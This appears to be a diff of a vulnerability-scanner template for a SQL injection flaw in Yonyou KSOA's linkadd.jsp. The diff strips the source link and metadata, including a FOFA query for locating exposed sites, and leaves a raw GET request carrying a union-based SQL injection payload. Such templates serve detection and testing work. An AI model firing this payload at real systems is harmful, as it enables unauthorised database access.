@@ -3,12 +3,8 @@ info:
   name: 用友时空 KSOA linkadd.jsp SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bfu0e7loxq25g5qx'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bfu0e7loxq25g5qx
-    fofa: title="企业信息系统门户"
 http:
 - raw:
   - 'GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1
